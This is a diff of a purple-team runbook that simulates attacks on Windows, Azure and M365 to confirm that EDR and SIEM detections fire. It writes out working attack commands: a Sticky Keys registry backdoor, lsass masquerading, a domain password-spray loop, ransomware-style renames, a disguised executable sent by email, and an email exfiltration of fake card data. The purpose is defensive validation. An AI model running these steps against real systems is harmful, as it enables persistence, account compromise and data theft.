@@ -1,108 +1,112 @@
 # TDA Manual Simulation Runbook — All Use Cases (No Downloads)
 
 For a **Windows machine with admin rights** where **Halcyon blocks any download**.
-Every test below uses **built-in Windows tools only** (PowerShell, CMD, browser) —
-no nmap, no Atomic Red Team, no sqlmap, no Az CLI. Each use case is written as
-**What to do → How to do (step by step) → Validate → Cleanup**.
+Every test uses **built-in Windows tools only** (PowerShell, CMD, browser) — no
+nmap, no Atomic Red Team, no sqlmap, no Az CLI. Format per use case:
+**What to do → How (step by step) → Validate → Cleanup**.
 
-> **Key point:** if Halcyon or the EDR **blocks** an action (a file, a script, a
+> **Key point:** if Halcyon/EDR **blocks** an action (a file, script, or
 > connection), that block **is a detection** — screenshot it and record it as a
 > PASS. A gap is when the action runs and *nothing* is logged/alerted.
 >
 > **Rules of engagement:** authorized testing only. Note UTC time + host/IP per
 > test. Announce to SOC. Use only fake test data. Replace every `<PLACEHOLDER>`.
 
-## One-time setup (Admin PowerShell)
+## Setup — where to run
+1. Start menu → type `PowerShell` → right-click **Windows PowerShell** → **Run as administrator**.
+2. It opens at `PS C:\Windows\System32>` — **that's fine, run everything from here.**
+   No folder needed — all test files go to Windows temp (`$env:TEMP`).
+3. Enable process logging once:
 ```powershell
-mkdir C:\TDA -Force ; cd C:\TDA               # working folder — run everything here
-auditpol /set /subcategory:"Process Creation" /success:enable   # enable 4688 logging
+auditpol /set /subcategory:"Process Creation" /success:enable
 auditpol /set /subcategory:"Process Creation" /failure:enable
 ```
 Marker to run before each test:
 ```powershell
 Get-Date -Format "yyyy-MM-dd HH:mm:ss" ; hostname ; ipconfig | findstr IPv4
 ```
+Confirm you're elevated: `whoami /groups | findstr /i "S-1-16-12288"` (a line = admin).
 
 ---
 
 # GROUP A — Host / Endpoint (all native, no downloads)
 
 ## UC0032 — Critical Malware Detected on EDR
-**What to do:** create the EICAR test file (harmless AV test string) on disk and open it.
+**What to do:** create the EICAR test file (harmless AV test string) and open it.
 **How:**
 ```powershell
 $e = 'X5O!P%@AP[4' + '\PZX54(P^)7CC)7}' + '$EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*'
-Set-Content -Path "C:\TDA\eicar.com" -Value $e -Encoding Ascii
-Get-Content "C:\TDA\eicar.com"
+Set-Content -Path "$env:TEMP\eicar.com" -Value $e -Encoding Ascii
+Get-Content "$env:TEMP\eicar.com"
 ```
-**Validate:** EDR alert `EICAR-Test-File`.
+**Validate:**
 ```spl
 index=* host="<HOSTNAME>" ("EICAR" OR "Test-File") earliest=-15m
 | table _time host threat_name action file_path
 ```
-**Cleanup:** `Remove-Item C:\TDA\eicar.com -Force -ErrorAction SilentlyContinue`
+**Cleanup:** `Remove-Item "$env:TEMP\eicar.com" -Force -EA SilentlyContinue`
 
 ## UC0149 — Multiple AV Infections on Same Host
 **What to do:** create several EICAR files so the AV logs multiple hits.
 **How:**
 ```powershell
 $e = 'X5O!P%@AP[4' + '\PZX54(P^)7CC)7}' + '$EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*'
-1..5 | ForEach-Object { Set-Content "C:\TDA\eicar_$_.com" -Value $e -Encoding Ascii }
-Get-ChildItem C:\TDA\eicar_*.com | ForEach-Object { Get-Content $_.FullName | Out-Null }
+1..5 | ForEach-Object { Set-Content "$env:TEMP\eicar_$_.com" -Value $e -Encoding Ascii }
+Get-ChildItem "$env:TEMP\eicar_*.com" | ForEach-Object { Get-Content $_.FullName | Out-Null }
 ```
 **Validate:** `... ("EICAR" OR "Test-File") | stats dc(file_path) as infections by host | where infections>=2`
-**Cleanup:** `Remove-Item C:\TDA\eicar_*.com -Force`
+**Cleanup:** `Remove-Item "$env:TEMP\eicar_*.com" -Force`
 
 ## UC0125 — Common Ransomware Extensions Detected
-**What to do:** create many files and rename them to known ransomware extensions + a ransom note.
+**What to do:** create many files renamed to known ransomware extensions + a ransom note.
 **How:**
 ```powershell
-$dir="C:\TDA\ransom"; New-Item -ItemType Directory -Force $dir | Out-Null
+$dir="$env:TEMP\ransom"; New-Item -ItemType Directory -Force $dir | Out-Null
 $ext=".locky",".crypt",".encrypted",".wncry",".cerber",".zepto",".crypto",".enc"
 1..20 | ForEach-Object { $f="$dir\doc$_.txt"; "data" | Set-Content $f; Rename-Item $f "$dir\doc$_$($ext[$_ % $ext.Count])" }
 "Your files are encrypted. Pay to recover." | Set-Content "$dir\READ_ME_DECRYPT.txt"
 ```
 **Validate:** `... (".locky" OR ".wncry" OR ".encrypted" OR "READ_ME_DECRYPT")`
-**Cleanup:** `Remove-Item C:\TDA\ransom -Recurse -Force`
+**Cleanup:** `Remove-Item "$env:TEMP\ransom" -Recurse -Force`
 
 ## UC0036 — APT Group Process Creation (Masquerading)
-**What to do:** copy `cmd.exe`, rename it to `lsass.exe` in a non-standard folder, run it.
+**What to do:** copy `cmd.exe`, rename to `lsass.exe` in a non-standard folder, run it.
 **How:**
 ```powershell
 Copy-Item C:\Windows\System32\cmd.exe C:\Windows\Temp\lsass.exe
 Start-Process C:\Windows\Temp\lsass.exe
-Get-Process lsass | Select-Object Id,Path,StartTime   # fake one shows path C:\Windows\Temp
+Get-Process lsass | Select-Object Id,Path,StartTime
 ```
 **Validate:**
 ```spl
 index=* host="<HOSTNAME>" EventCode=4688 New_Process_Name="*lsass.exe" earliest=-15m
 | table _time Creator_Process_Name New_Process_Name Process_Command_Line
 ```
-Tell: `New_Process_Name = C:\Windows\Temp\lsass.exe` (wrong path). If EDR kills it on launch = detection.
+Tell: fake one shows `C:\Windows\Temp\lsass.exe`. If EDR kills it on launch = detection.
 **Cleanup:** `Stop-Process -Name lsass -Force -EA SilentlyContinue; Remove-Item C:\Windows\Temp\lsass.exe -Force -EA SilentlyContinue`
 
 ## UC0182 — Application Parents Spawning Malicious Children
-**What to do:** make a script host (`wscript.exe`) spawn `cmd.exe` — the parent→child anomaly.
+**What to do:** make `wscript.exe` spawn `cmd.exe` — the parent→child anomaly.
 **How:**
 ```powershell
-Set-Content "C:\TDA\uc0182.vbs" 'CreateObject("WScript.Shell").Run "cmd.exe /c whoami > C:\TDA\uc0182.txt"'
-wscript.exe "C:\TDA\uc0182.vbs"
-Get-Content "C:\TDA\uc0182.txt"    # confirms the child ran
+Set-Content "$env:TEMP\uc0182.vbs" 'CreateObject("WScript.Shell").Run "cmd.exe /c whoami > %TEMP%\uc0182.txt"'
+wscript.exe "$env:TEMP\uc0182.vbs"
+Get-Content "$env:TEMP\uc0182.txt"
 ```
 **Validate:**
 ```spl
 index=* host="<HOSTNAME>" EventCode=4688 New_Process_Name="*cmd.exe" Creator_Process_Name="*wscript.exe" earliest=-15m
 | table _time Creator_Process_Name New_Process_Name Process_Command_Line
 ```
-**Cleanup:** `Remove-Item C:\TDA\uc0182.* -Force`
+**Cleanup:** `Remove-Item "$env:TEMP\uc0182.*" -Force`
 
 ## UC0185 — Abuse of Accessibility Binaries (Sticky Keys / Shift ×5)
-**What to do:** set `cmd.exe` as the debugger for `sethc.exe` via registry (reversible, no file replace).
+**What to do:** set `cmd.exe` as the debugger for `sethc.exe` via registry (reversible).
 **How:**
 ```powershell
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
 ```
-(Optional proof: lock screen → press Shift ×5 → SYSTEM cmd opens.)
+(Proof: lock screen → Shift ×5 → SYSTEM cmd opens.)
 **Validate:**
 ```spl
 index=* host="<HOSTNAME>" ("Image File Execution Options" AND ("sethc.exe" OR "utilman.exe")) earliest=-15m
@@ -114,7 +118,7 @@ index=* host="<HOSTNAME>" ("Image File Execution Options" AND ("sethc.exe" OR "u
 **What to do:** create + run a scheduled task that launches a shell.
 **How:**
 ```powershell
-schtasks /create /tn "uc0187test" /tr "cmd.exe /c whoami > C:\TDA\uc0187.txt" /sc once /st 23:59 /f
+schtasks /create /tn "uc0187test" /tr "cmd.exe /c whoami > %TEMP%\uc0187.txt" /sc once /st 23:59 /f
 schtasks /run /tn "uc0187test"
 schtasks /delete /tn "uc0187test" /f
 ```
@@ -187,14 +191,10 @@ $c2="http://<LAB_C2_HOST>/beacon"
 **What to do:** try one password against many accounts (agree accounts/list first — avoid lockouts).
 **How:**
 ```powershell
-# build a user list natively:
-(net user /domain) | Out-File C:\TDA\users.txt
-$users = Get-Content C:\TDA\users.txt | Where-Object {$_ -match '^\S' } 
+(net user /domain) | Out-File "$env:TEMP\users.txt"
+$users = Get-Content "$env:TEMP\users.txt" | Where-Object { $_ -match '^\S' }
 $pw = "Winter2026!"
-foreach ($u in $users) {
-  cmd /c "net use \\<DC>\IPC$ /user:$u $pw" 2>$null
-  Start-Sleep -Milliseconds 300
-}
+foreach ($u in $users) { cmd /c "net use \\<DC>\IPC$ /user:$u $pw" 2>$null; Start-Sleep -Milliseconds 300 }
 ```
 **Validate:** `index=* EventCode=4625 | stats dc(user) as accounts by src | where accounts>=10`
 
@@ -214,7 +214,7 @@ $u="http://<WEBAPP>"
 **Validate:** WAF/web logs show SQLi patterns from your source IP.
 
 ## UC0229 — Web Application Exploit Detected
-**What to do:** send common exploit payloads (XSS, path traversal, command injection, Log4j probe).
+**What to do:** send common exploit payloads (XSS, traversal, command injection, Log4j probe).
 **How:**
 ```powershell
 $u="http://<WEBAPP>"
@@ -232,10 +232,10 @@ $u="http://<WEBAPP>"
 **Requires:** an SMTP server/relay you can send through + a target mailbox.
 **How:**
 ```powershell
-Copy-Item C:\Windows\System32\calc.exe C:\TDA\invoice.exe   # risky extension (built-in file, no download)
+Copy-Item C:\Windows\System32\calc.exe "$env:TEMP\invoice.exe"
 Send-MailMessage -From "tester@yourlab.local" -To "<victim@customer.com>" `
   -Subject "Invoice attached" -Body "Please review." `
-  -Attachments "C:\TDA\eicar.com","C:\TDA\invoice.exe" -SmtpServer "<SMTP_SERVER>"
+  -Attachments "$env:TEMP\eicar.com","$env:TEMP\invoice.exe" -SmtpServer "<SMTP_SERVER>"
 ```
 **Validate:** mail security/SIEM shows malware verdict or blocked extension.
 
@@ -255,54 +255,53 @@ Send-MailMessage -From "security-alert@micros0ft-support.com" -To "<victim@custo
 **Requires:** a DLP solution watching email/upload/USB.
 **How:**
 ```powershell
-$dir="C:\TDA\dlp"; New-Item -ItemType Directory -Force $dir | Out-Null
+$dir="$env:TEMP\dlp"; New-Item -ItemType Directory -Force $dir | Out-Null
 1..5 | ForEach-Object {
 @"
 Credit Card: 4111 1111 1111 1111
 SSN: 123-45-6789
 IBAN: GB82 WEST 1234 5698 7654 32
 "@ | Set-Content "$dir\sensitive_$_.txt" }
-# then send each out (repeat to create multiple violations):
 Get-ChildItem $dir | ForEach-Object { Send-MailMessage -From "<you>" -To "<external@test.com>" -Subject "data" -Attachments $_.FullName -SmtpServer "<SMTP_SERVER>" }
 ```
 **Validate:** DLP console/SIEM shows ≥2 violations for the same user.
 
 ---
 
-# GROUP E — Cloud: Azure / M365 (via BROWSER — no Az CLI download needed)
+# GROUP E — Cloud: Azure / M365 (via BROWSER — no Az CLI download)
 
-> Since downloads are blocked, do all cloud tests in the **browser** (Azure Portal
-> / Entra portal / Azure Cloud Shell). No local install required.
+> Downloads are blocked, so do all cloud tests in the **browser** (Azure Portal /
+> Entra portal / Azure Cloud Shell). No local install needed.
 > **Requires:** an Azure/M365 test account with the right role.
 
 ## UC0458 — Azure Activity CRUD Operation Detected
-**What to do:** create/modify/delete an Azure resource in the portal.
-**How:** `https://portal.azure.com` → Resource groups → **Create** a group `tda-test-rg` → add a **tag** (update) → **Delete** the group. (Or use **Cloud Shell** in the portal: `az group create/update/delete` — runs in browser, nothing installed.)
-**Validate:** Azure Activity Log / Sentinel shows the create/update/delete.
+**What to do:** create/modify/delete an Azure resource.
+**How:** `https://portal.azure.com` → Resource groups → **Create** `tda-test-rg` → add a **tag** (update) → **Delete** it. (Or portal **Cloud Shell**: `az group create/update/delete` — runs in browser.)
+**Validate:** Azure Activity Log / Sentinel shows create/update/delete.
 
 ## UC0215 — Explicit MFA Deny
 **What to do:** sign in with a test account and DENY the MFA prompt.
-**How:** open `https://portal.office.com` in a private window → sign in as the test user → at the Authenticator push, tap **Deny / "No, it's not me"** (or reject).
-**Validate:** Entra sign-in logs show MFA denied / user declined.
+**How:** `https://portal.office.com` (private window) → sign in as test user → at the push, tap **Deny / "No, it's not me"**.
+**Validate:** Entra sign-in logs show MFA denied.
 
 ## UC0327 — Azure AD Privileged Access Outside PIM
-**What to do:** assign/use a privileged role directly instead of activating via PIM.
-**How:** Entra portal → Roles and administrators → assign e.g. **User Access Administrator** to the test user as a **permanent** (non-PIM) assignment, then perform an admin action.
-**Validate:** Entra audit log shows privileged assignment/action without a PIM activation.
+**What to do:** assign/use a privileged role directly instead of via PIM.
+**How:** Entra portal → Roles and administrators → assign **User Access Administrator** to the test user as a **permanent** (non-PIM) assignment, then do an admin action.
+**Validate:** Entra audit log shows privileged action without a PIM activation.
 
 ## Password Spraying M365
-**What to do:** try one password across several M365 accounts.
-**How (no tool download):** in a browser, attempt sign-in at `https://login.microsoftonline.com` with the same password across a few agreed test accounts; or run from Cloud Shell if scripting is allowed. Keep it small to avoid lockouts.
+**What to do:** try one password across a few M365 accounts.
+**How:** browser → `https://login.microsoftonline.com` → attempt sign-in with the same password across agreed test accounts (keep small to avoid lockouts).
 **Validate:** Entra sign-in logs — multiple failed logons across accounts from one source.
 
 ## Malicious MFA Takeover
-**What to do:** simulate MFA fatigue or register a new MFA method on a test account.
-**How:** repeatedly attempt sign-in to spam Authenticator push prompts, or go to `https://aka.ms/mfasetup` and add a new MFA method to the test account.
-**Validate:** Entra logs show repeated MFA requests or a new security-info registration.
+**What to do:** simulate MFA fatigue or register a new MFA method.
+**How:** repeatedly attempt sign-in to spam push prompts, or `https://aka.ms/mfasetup` → add a new MFA method to the test account.
+**Validate:** Entra logs show repeated MFA requests or new security-info registration.
 
 ## Abusing Virtual Machines
-**What to do:** run a command on an Azure VM via the control plane (Run Command).
-**How:** Azure Portal → the VM → **Run command** → **RunPowerShellScript** → enter `whoami; hostname` → Run. (No local tooling.)
+**What to do:** run a command on an Azure VM via the control plane.
+**How:** Azure Portal → the VM → **Run command** → **RunPowerShellScript** → `whoami; hostname` → Run.
 **Validate:** Activity log shows `runCommand` on the VM.
 
 ---
@@ -320,8 +319,8 @@ Get-ChildItem $dir | ForEach-Object { Send-MailMessage -From "<you>" -To "<exter
 ---
 
 ## Per-test checklist
-1. Note UTC time + host/IP.  2. Announce to SOC.  3. Run the steps from `C:\TDA`.
-4. If Halcyon/EDR **blocks** it → screenshot = PASS (detection). 
+1. Note UTC time + host/IP.  2. Announce to SOC.  3. Run the steps in Admin PowerShell (from System32 — fine).
+4. If Halcyon/EDR **blocks** it → screenshot = PASS (detection).
 5. Pull events with the SPL (adjust index/field names).  6. Record pass/gap.  7. Clean up.
 
-*No downloads used — all built-in Windows tools + browser for cloud. Field names vary by data source; use only fake test data and lab-controlled hosts.*
+*No downloads, no working folder — all built-in Windows tools + `$env:TEMP` + browser for cloud. Field names vary by data source; use only fake test data and lab-controlled hosts.*
